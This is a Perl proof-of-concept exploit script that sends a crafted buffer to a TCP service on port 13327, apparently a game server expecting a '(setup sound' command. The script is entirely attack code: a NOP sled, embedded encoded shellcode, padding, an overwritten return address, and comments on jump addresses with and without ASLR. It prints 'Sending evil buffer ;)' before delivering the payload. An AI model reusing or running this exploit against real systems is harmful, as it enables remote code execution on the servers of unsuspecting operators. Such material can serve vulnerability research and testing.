#!/usr/bin/perl

use warnings;
use strict;

use Socket;

my $target="127.0.0.1";
my $service="13327";
my $protocol="tcp";

my $server=inet_aton $target;
my $port=getservbyname $service,$protocol;
my $buffer='';

my $shellcode = 
"\xba\xaa\x34\x1c\xfa\xdd\xc7\xd9\x74\x24\xf4\x5e\x33\xc9" .
"\xb1\x14\x31\x56\x14\x03\x56\x14\x83\xee\xfc\x48\xc1\x2d" .
"\x21\x7b\xc9\x1d\x96\xd0\x64\xa0\x91\x37\xc8\xc2\x6c\x37" .
"\x72\x55\x3d\x5f\x87\x69\xd0\xc3\xed\x79\x83\xab\x78\x98" .
"\x49\x2d\x23\x96\x0e\x38\x92\x2c\xbc\x3e\xa5\x4b\x0f\xbe" .
"\x86\x23\xe9\x73\x88\xd7\xaf\xe1\xb6\x8f\x82\x75\x81\x56" .
"\xe5\x1d\x3d\x86\x66\xb5\x29\xf7\xea\x2c\xc4\x8e\x08\xfe" .
"\x4b\x18\x2f\x4e\x60\xd7\x30";

#0xb7da7a26 <- direct jump without ASLR
#0x08071e4e <- indirect jump with ASLR

my $crash = "\x90"x200 . $shellcode . "\x41"x4063 . "\x4e\x1e\x07\x08" . "\43"x7;
my $payload="\x11(setup sound " . $crash . "\x90\x00#";

socket(SOCKET, PF_INET, SOCK_STREAM, 0) or die "socket: $!\n";
connect(SOCKET, pack_sockaddr_in($service,$server)) or die "connect: $!\n";

print "Sending evil buffer ;)\n";
recv(SOCKET,$buffer,1024,0);
print "$buffer\n";
send(SOCKET,$payload,0);
close(SOCKET);
print "payload sent ...\n";
